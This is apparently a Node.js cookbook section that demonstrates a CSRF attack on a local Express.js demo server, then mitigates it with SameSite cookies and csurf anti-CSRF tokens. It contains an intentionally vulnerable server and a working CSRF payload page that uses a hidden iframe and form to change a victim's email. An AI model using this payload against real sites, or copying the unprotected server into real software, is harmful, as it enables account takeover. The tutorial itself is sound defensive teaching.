     It’s very difficult to replicate a CSRF attack on any modern browser.
    
    
     However, as there are still many users on older browsers, it’s important to understand how these attacks work and how to protect against them.
    
    
     In this recipe, we’ll replicate a CSRF attack on the same domain.
    
    
     Please refer to the
    
    <em class="italic">
     
      Developers: Get Ready for New SameSite=None; Secure Cookie Settings
     
    </em>
    
     (
    
    <a href="https://blog.chromium.org/2019/10/developers-get-ready-for-new.html">
     
      https://blog.chromium.org/2019/10/developers-get-ready-for-new.html
     
    </a>
    
     ) Chromium blog, which covers some of the updates that have been made to Google Chrome to prevent
    
    
     
      CSRF attacks.
     
    
   </p>
   <h2 id="_idParaDest-306">
    <a id="_idTextAnchor313">
    </a>
    
     Getting ready
    
   </h2>
   <p>
    
     Follow
    
    
     
      these steps:
     
    
   </p>
   <ol>
    <li>
     
      Start by creating a directory named
     
     <strong class="source-inline">
      
       express-csrf
      
     </strong>
     
      for this recipe and initializing the project
     
     
      
       with
      
     
     
      <strong class="source-inline">
       
        npm
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ mkdir express-csrf</strong>
<strong class="bold">$ cd express-csrf</strong>
<strong class="bold">$ npm init --yes</strong>
<strong class="bold">$ npm install express express-session body-parser</strong></pre>
    </li>
    <li>
     
      Create a file named
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      .
     
     
      This will contain our server, which is vulnerable to
     
     
      
       CSRF attacks:
      
     
     <pre class="source-code">
<strong class="bold">$ touch server.js</strong></pre>
    </li>
    <li>
     
      In
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      , import the required modules and register the
     
     
      <strong class="source-inline">
       
        express-session
       
      </strong>
     
     
      
       middleware:
      
     
     <pre class="source-code">
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const app = express();
const mockUser = {
  username: 'beth',
  password: 'badpassword',
  email: 'beth@example.com'
};
app.use(
  session({
    secret: 'Node Cookbook',
    name: 'SESSIONID',
    resave: false,
    saveUninitialized: false
  })
);
app.use(bodyParser.urlencoded({ extended: false }));</pre>
    </li>
    <li>
     
      Next, in
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      , we
     
     <a id="_idIndexMarker768">
     </a>
     
      need to define the routes for
     
     
      
       our server:
      
     
     <pre class="source-code">
app.get('/', (req, res) =&gt; {
  if (req.session.user) return
    res.redirect('/account');
  res.send(`
    &lt;h1&gt;Social Media Account - Login&lt;/h1&gt;
    &lt;form method="POST" action="/"&gt;
      &lt;label&gt; Username &lt;input name=username&gt; &lt;/label&gt;
      &lt;label&gt; Password &lt;input name=password
        type=password&gt; &lt;/label&gt;
      &lt;input type=submit&gt;
    &lt;/form&gt;
  `);
});
app.post('/', (req, res) =&gt; {
  if (
    req.body.username === mockUser.username &amp;&amp;
    req.body.password === mockUser.password
  ) {
    req.session.user = req.body.username;
  }
  if (req.session.user) res.redirect('/account');
  else res.redirect('/');
});
app.get('/account', (req, res) =&gt; {
  if (!req.session.user) return res.redirect('/');
    res.send(`
      &lt;h1&gt;Social Media Account - Settings&lt;/h1&gt;
      &lt;p&gt; Email: ${mockUser.email} &lt;/p&gt;
      &lt;form method="POST" action=/update&gt;
        &lt;input name=email value="${mockUser.email}"&gt;
        &lt;input type=submit value=Update &gt;
      &lt;/form&gt;
    `);
});
app.post('/update', (req, res) =&gt; {
  if (!req.session.user) return res.sendStatus(403);
  mockUser.email = req.body.email;
  res.redirect('/');
});</pre>
    </li>
    <li>
     
      Then, add the
     
     <a id="_idIndexMarker769">
     </a>
     
      following to
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      to start
     
     
      
       the server:
      
     
     <pre class="source-code">
app.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</pre>
    </li>
   </ol>
   <p>
    
     Now, we’re ready to start
    
    
     
      this recipe.
     
    
   </p>
   <h2 id="_idParaDest-307">
    <a id="_idTextAnchor314">
    </a>
    
     How to do it…
    
   </h2>
   <p>
    
     First, we’ll create a malicious web page that can replicate a CSRF attack.
    
    
     After that, we’ll learn how to protect our Express.js server against
    
    
     
      these attacks.
     
    
   </p>
   <p>
    
     Your steps should be formatted
    
    
     
      like so:
     
    
   </p>
   <ol>
    <li>
     
      Start
     
     
      
       the server:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong>
<strong class="bold">Server listening on port 3000</strong></pre>
    </li>
    <li>
     
      Navigate to
     
     <strong class="source-inline">
      
       http://localhost:3000
      
     </strong>
     
      in your browser and expect to see the following HTML login form.
     
     
      Enter
     
     <strong class="source-inline">
      
       beth
      
     </strong>
     
      as the username and
     
     <strong class="source-inline">
      
       badpassword
      
     </strong>
     
      as the password.
     
     
      Then,
     
     
      
       click
      
     
     
      <strong class="bold">
       
        Submit
       
      </strong>
     
     
      
       :
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.9 – Social Media Account – Login" src="img/B19212_09_09.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.9 – Social Media Account – Login
    
   </p>
   <ol>
    <li value="3">
     
      Once logged
     
     <a id="_idIndexMarker770">
     </a>
     
      in, you should be taken to the
     
     <strong class="bold">
      
       Settings
      
     </strong>
     
      page of the demo social media profile.
     
     
      Notice that there’s a single field to update your email.
     
     
      Try updating the email to something else.
     
     
      You should see that the update is reflected after
     
     
      
       clicking
      
     
     
      <strong class="bold">
       
        Update
       
      </strong>
     
     
      
       :
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.10 – Social Media Account – Settings" src="img/B19212_09_10.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.10 – Social Media Account – Settings
    
   </p>
   <ol>
    <li value="4">
     
      Now, we’re going to create our malicious web page.
     
     
      Create a file named
     
     <strong class="source-inline">
      
       csrf-server.js
      
     </strong>
     
      .
     
     
      This is where we’ll build our malicious
     
     
      
       web page:
      
     
     <pre class="source-code">
<strong class="bold">$ touch csrf-server.js</strong></pre>
    </li>
    <li>
     
      Add the following
     
     <a id="_idIndexMarker771">
     </a>
     
      code to create the malicious
     
     
      
       web page:
      
     
     <pre class="source-code">
const http = require('node:http');
const attackerEmail = 'attacker@example.com';
const server = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(`
&lt;iframe name=hide style="position:absolute;left:-
  1000px"&gt;&lt;/iframe&gt;
&lt;form method="post"
  action="http://localhost:3000/update" target=hide&gt;
&lt;input type=hidden name=email
  value="${attackerEmail}"&gt;
&lt;input type=submit value="Click this to win!"&gt;
&lt;/form&gt;`);
});
server.listen(3001, () =&gt; {
  console.log('Server listening on port 3001');
});</pre>
    </li>
    <li>
     
      In a second
     
     <a id="_idIndexMarker772">
     </a>
     
      terminal window, start the
     
     
      <strong class="source-inline">
       
        csrf-server.js
       
      </strong>
     
     
      
       server:
      
     
     <pre class="source-code">
<strong class="bold">$ node csrf-server.js</strong>
<strong class="bold">Server listening on port 3001</strong></pre>
    </li>
   </ol>
   <p class="callout-heading">
    
     Important note
    
   </p>
   <p class="callout">
    
     In a real CSRF attack, we’d expect the attack to come from a different domain to the vulnerable server.
    
    
     However, due to advances in web browser security, many CSRF attacks are prevented by the browser.
    
    
     For this recipe, we’ll demonstrate the attack on the same domain.
    
    
     Note that CSRF attacks are still possible today, particularly as many users may be using older browsers that don’t have the latest security features to protect against
    
    
     
      CSRF attacks.
     
    
   </p>
   <ol>
    <li value="7">
     
      Navigate to
     
     <strong class="source-inline">
      
       http://localhost:3001
      
     </strong>
     
      in your browser.
     
     
      Expect to see the following output showing a
     
     
      
       single button:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.11 – Malicious CSRF web page showing a suspicious “Click this to win!” button" src="img/B19212_09_11.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.11 – Malicious CSRF web page showing a suspicious “Click this to win!”
    
    
     button
    
   </p>
   <ol>
    <li value="8">
     
      Click the
     
     <strong class="bold">
      
       Click this to win!
      
     </strong>
     
      button.
     
     
      By clicking the button, an HTTP
     
     <strong class="source-inline">
      
       POST
      
     </strong>
     
      request is sent to
     
     <strong class="source-inline">
      
       http://localhost:3000/update
      
     </strong>
     
      , with a body containing the
     
     <strong class="source-inline">
      
       attacker@example.com
      
     </strong>
     
      email.
     
     
      By clicking this button, the HTTP
     
     <strong class="source-inline">
      
       POST
      
     </strong>
     
      request
     
     <a id="_idIndexMarker773">
     </a>
     
      has been sent to the real website’s server, leveraging the cookie stored in
     
     
      
       the browser.
      
     
    </li>
    <li>
     
      Go back to the social media profile page and refresh it.
     
     
      We’ll see that the attacker has managed to update the
     
     
      
       email address:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.12 – The Social Media Account – Settings page showing that the email has been updated to attacker@example.com" src="img/B19212_09_12.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.12 – The Social Media Account – Settings page showing that the email has been updated to attacker@example.com
    
   </p>
   <ol>
    <li value="10">
     
      Now, let’s fix the server so that it isn’t susceptible to CSRF attacks.
     
     
      First, copy the
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      file to a file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        fixed-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ cp server.js fixed-server.js</strong></pre>
    </li>
    <li>
     
      To fix the server, we
     
     <a id="_idIndexMarker774">
     </a>
     
      need to add some additional configuration to the
     
     <strong class="source-inline">
      
       express-session
      
     </strong>
     
      middleware.
     
     
      Change the
     
     <strong class="source-inline">
      
       express-session
      
     </strong>
     
      configuration to
     
     
      
       the following:
      
     
     <pre class="source-code">
app.use(
  session({
    secret: 'Node Cookbook',
    name: 'SESSIONID',
    resave: false,
    saveUninitialized: false,
    cookie: { sameSite: true }
  })
);</pre>
     <p class="list-inset">
      
       Note the addition of the
      
      <strong class="source-inline">
       
        { cookie : { sameSite : true }}
       
      </strong>
      
       
        configuration.
       
      
     </p>
    </li>
    <li>
     
      Now, having stopped the original server,
     
     
      
       start
      
     
     
      <strong class="source-inline">
       
        fixed-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
$ node fixed-server.js
Server listening on port 3000</pre>
    </li>
    <li>
     
      Return to
     
     <strong class="source-inline">
      
       http://localhost:3000
      
     </strong>
     
      and log in again with the same credentials as before.
     
     
      Then, in a second browser tab, visit
     
     <strong class="source-inline">
      
       http://127.0.0.1:3001
      
     </strong>
     
      (
     
     <strong class="source-inline">
      
       csrf-server.js
      
     </strong>
     
      should still be running) and click the
     
     <a id="_idIndexMarker775">
     </a>
     
      button again.
     
     
      Note that you must navigate using
     
     <strong class="source-inline">
      
       http://127.0.0.1:3001
      
     </strong>
     
      rather than
     
     <strong class="source-inline">
      
       http://localhost:3001
      
     </strong>
     
      ; otherwise, the request will be considered as coming from the
     
     
      
       same domain.
      
     
     <p class="list-inset">
      
       You’ll find that this time, clicking the button will not update the email on the
      
      <strong class="bold">
       
        Social Media Account - Settings
       
      </strong>
      
       page.
      
      
       If we open
      
      <strong class="bold">
       
        Chrome DevTools
       
      </strong>
      
       |
      
      <strong class="bold">
       
        Console
       
      </strong>
      
       , we’ll even see a
      
      <strong class="bold">
       
        403 (Forbidden)
       
      </strong>
      
       error, confirming that our change has prevented
      
      
       
        the attack:
       
      
     </p>
    </li>
   </ol>
   <div><div><img alt="Figure 9.13 – The Chrome DevTools window showing 403 (Forbidden) on our CSRF request" src="img/B19212_09_13.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.13 – The Chrome DevTools window showing 403 (Forbidden) on our CSRF request
    
   </p>
   <p>
    
     This recipe has demonstrated a simple CSRF attack and the associated risks.
    
    
     We mitigated the vulnerability
    
    <a id="_idIndexMarker776">
    </a>
    
     by supplying additional configuration using the
    
    
     <strong class="source-inline">
      
       express-session
      
     </strong>
    
    
     
      middleware.
     
    
   </p>
   <h2 id="_idParaDest-308">
    <a id="_idTextAnchor315">
    </a>
    
     How it works…
    
   </h2>
   <p>
    
     In this recipe, we demonstrated a simple CSRF attack.
    
    
     The attacker crafted a malicious site to leverage a cookie from a social media website to update a user’s email to their own.
    
    
     This is a dangerous vulnerability as once an attacker has updated the email to their own, they can end up with control over
    
    
     
      the account.
     
    
   </p>
   <p>
    
     To mitigate this vulnerability, we passed the
    
    <strong class="source-inline">
     
      express-session
     
    </strong>
    
     middleware the
    
    <strong class="source-inline">
     
      { cookie : { sameSite : true }}
     
    </strong>
    
     configuration.
    
    
     The
    
    <strong class="source-inline">
     
      SameSite
     
    </strong>
    
     attribute of the cookie header can be set to the following
    
    
     
      three values:
     
    
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      
       none
      
     </strong>
     
      : The cookie can be shared and sent in all contexts, including
     
     
      
       cross-origin requests
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       lax
      
     </strong>
     
      : This allows the cookie to be shared with HTTP
     
     <strong class="source-inline">
      
       GET
      
     </strong>
     
      requests initiated by third-party websites, but only when it results in
     
     
      
       top-level navigation
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       strict
      
     </strong>
     
      : Cookies can only be sent through a request in a first-party context – if the cookie matches the current
     
     
      
       site URL
      
     
    </li>
   </ul>
   <p>
    
     Setting the
    
    <strong class="source-inline">
     
      { sameSite : true }
     
    </strong>
    
     configuration option in the
    
    <strong class="source-inline">
     
      express-session
     
    </strong>
    
     middleware configuration equates to setting the
    
    <strong class="source-inline">
     
      Set-Cookie : SameSite
     
    </strong>
    
     attribute to
    
    
     <strong class="source-inline">
      
       strict
      
     </strong>
    
    
     
      mode.
     
    
   </p>
   <p>
    
     Inspecting the header of the request in this recipe would show a
    
    <strong class="source-inline">
     
      Set-Cookie
     
    </strong>
    
     header similar to
    
    
     
      the
     
    
    
     <a id="_idIndexMarker777">
     </a>
    
    
     
      following:
     
    
   </p>
   <pre class="console">
Set-Cookie:
SESSIONID=s%3AglL_...gIvei%2BEs; Path=/; HttpOnly; SameSite=Strict</pre>
   <h2 id="_idParaDest-309">
    <a id="_idTextAnchor316">
    </a>
    
     There’s more…
    
   </h2>
   <p>
    
     Some older browsers don’t support the
    
    <strong class="source-inline">
     
      Set-Cookie SameSite
     
    </strong>
    
     header attribute.
    
    
     A strategy for dealing with these cases is to generate an anti-CSRF token.
    
    
     These anti-CSRF tokens are stored in the user session, which means the attacker would need access to the session itself to carry out
    
    
     
      the attack.
     
    
   </p>
   <p>
    
     We can use a module named
    
    <strong class="source-inline">
     
      csurf
     
    </strong>
    
     to help implement
    
    
     
      anti-CSRF tokens:
     
    
   </p>
   <ol>
    <li>
     
      Still in the
     
     <strong class="source-inline">
      
       express-csrf
      
     </strong>
     
      directory, copy
     
     <strong class="source-inline">
      
       fixed-server.js
      
     </strong>
     
      to a new file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        csurf-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ cp fixed-server.js csurf-server.js</strong></pre>
    </li>
    <li>
     
      Install the
     
     
      <strong class="source-inline">
       
        csurf
       
      </strong>
     
     
      
       module:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install csurf</strong></pre>
    </li>
    <li>
     
      Next, we need to import and initialize the
     
     <strong class="source-inline">
      
       csurf
      
     </strong>
     
      module in the
     
     <strong class="source-inline">
      
       csruf-server.js
      
     </strong>
     
      file.
     
     
      Add the following lines below the
     
     
      <strong class="source-inline">
       
        express-session
       
      </strong>
     
     
      
       import:
      
     
     <pre class="source-code">
const csurf = require('csurf');
const csrf = csurf();</pre>
    </li>
    <li>
     
      Then, we need to alter the HTTP
     
     <strong class="source-inline">
      
       GET
      
     </strong>
     
      request handler so that it uses the
     
     <strong class="source-inline">
      
       csrf
      
     </strong>
     
      middleware.
     
     
      We can achieve this by supplying it as the second parameter to the
     
     <strong class="source-inline">
      
       get()
      
     </strong>
     
      method of the
     
     <strong class="source-inline">
      
       /account
      
     </strong>
     
      
       route handler:
      
     
     <pre class="source-code">
app.get('/account', csrf, (req, res) =&gt; {
  if (!req.session.user) return res.redirect('/');
  res.send(`
      &lt;h1&gt;Social Media Account - Settings&lt;/h1&gt;
      &lt;p&gt; Email: ${mockUser.email} &lt;/p&gt;
      &lt;form method="POST" action=/update&gt;
<strong class="bold">        &lt;input type=hidden name=_csrf</strong>
<strong class="bold">          value="${req.csrfToken()}"&gt;</strong>
        &lt;input name=email value="${mockUser.email}"&gt;
        &lt;input type=submit value=Update &gt;
      &lt;/form&gt;
    `);
});</pre>
     <p class="list-inset">
      
       In the HTML
      
      <a id="_idIndexMarker778">
      </a>
      
       template, we generate and inject
      
      <strong class="source-inline">
       
        csrfToken
       
      </strong>
      
       using the
      
      <strong class="source-inline">
       
        req.csrfToken()
       
      </strong>
      
       method of the request object.
      
      
       We inject the token into the HTML template as a hidden field named
      
      <strong class="source-inline">
       
        _csrf
       
      </strong>
      
       .
      
      
       The
      
      <strong class="source-inline">
       
        csrf
       
      </strong>
      
       middleware looks for a token with
      
      
       
        that name.
       
      
     </p>
    </li>
    <li>
     
      We also need to update the
     
     <strong class="source-inline">
      
       post()
      
     </strong>
     
      method of our
     
     <strong class="source-inline">
      
       /update
      
     </strong>
     
      route handler so that it can use the
     
     
      <strong class="source-inline">
       
        csrf
       
      </strong>
     
     
      
       middleware:
      
     
     <pre class="source-code">
app.post('/update', <strong class="bold">csrf</strong>, (req, res) =&gt; {
  if (!req.session.user) return res.sendStatus(403);
  mockUser.email = req.body.email;
  res.redirect('/');
});</pre>
     <p class="list-inset">
      
       Upon an HTTP
      
      <strong class="source-inline">
       
        POST
       
      </strong>
      
       request, the
      
      <strong class="source-inline">
       
        csrf
       
      </strong>
      
       middleware will check the body of a request for the token stored in the
      
      <strong class="source-inline">
       
        _csrf
       
      </strong>
      
       field.
      
      
       The middleware then validates the supplied token with the token stored in the
      
      
       
        user’s session.
       
      
     </p>
    </li>
    <li>
     
      Start
     
     
      
       the server:
      
     
     <pre class="source-code">
<strong class="bold">$ node csurf-server.js</strong>
<strong class="bold">Server listening on port 3000</strong></pre>
    </li>
    <li>
     
      Navigate to
     
     <strong class="source-inline">
      
       http://localhost:3000
      
     </strong>
     
      and log in with the same username and password that we used in this recipe.
     
     
      Click on
     
     <strong class="bold">
      
       View Page Source
      
     </strong>
     
      on the
     
     <strong class="bold">
      
       Social Media Account - Settings
      
     </strong>
     
      page.
     
     
      You should see the following HTML showing the
     
     <a id="_idIndexMarker779">
     </a>
     
      hidden
     
     
      <strong class="source-inline">
       
        _csrf
       
      </strong>
     
     
      
       field:
      
     
     <pre class="source-code">
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Social Media Account - Settings&lt;/h1&gt;
      &lt;p&gt; Email: beth@example.com &lt;/p&gt;
      &lt;form method="POST" action="/update"&gt;
        <strong class="bold">&lt;input type="hidden" name="_csrf"</strong>
<strong class="bold">          value="r3AByUA1-csl3hIjrE3J4fB6nRoBT8GCr9YE"&gt;</strong>
        &lt;input name="email" value="beth@example.com"&gt;
        &lt;input type="submit" value="Update"&gt;
      &lt;/form&gt;
    &lt;/body&gt;
&lt;/html&gt;</pre>
     <p class="list-inset">
      
       You should be able to update the email
      
      
       
        as before.
       
      
     </p>
    </li>
   </ol>
   <p>
    
     The
    
    <strong class="source-inline">
     
      csurf
     
    </strong>
    
     middleware helps mitigate the risk of CSRF attacks in older browsers that don’t support the
    
    <strong class="source-inline">
     
      Set-Cookie:SameSite
     
    </strong>
    
     attribute.
    
    
     However, our servers could still be vulnerable to more complex CSRF attacks, even when using the
    
    <strong class="source-inline">
     
      csurf
     
    </strong>
    
     middleware.
    
    
     The attacker could use XSS to obtain the CSRF token, and then craft a CSRF attack using the
    
    <strong class="source-inline">
     
      _csrf
     
    </strong>
    
     token.
    
    
     However, this is best-effort mitigation in the absence of support for the
    
    
     <strong class="source-inline">
      
       Set-Cookie:SameSite
      
     </strong>
    
    
     
      attribute.
     
    
   </p>
   <p>
    
     Slowing an attacker down by making the attack they have to create more complex is an effective way of reducing risk.
    
    
     Many attackers will try to exploit many websites at a time – if they experience a website that takes significantly longer to exploit, in the interest of time, they will often
    
    <a id="_idIndexMarker780">
    </a>
    
     just move on to
    
    
     
      another website.
     
    
   </p>
   <h2 id="_idParaDest-310">
    <a id="_idTextAnchor317">
    </a>
    
     See also
    
   </h2>
   <ul>
    <li>
     
      The
     
     <em class="italic">
      
       Authentication with Fastify
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Hardening headers with Helmet
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Anticipating malicious input
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Preventing JSON pollution
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Guarding against cross-site scripting
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Diagnosing issues with Chrome DevTools
      
     </em>
     
      recipe in
     
     <a href="B19212_12.xhtml#_idTextAnchor388">
      
       <em class="italic">
        
         Chapter 12
        
       </em>
      
     </a>
    </li>
   </ul>
  </div>
 </body></html>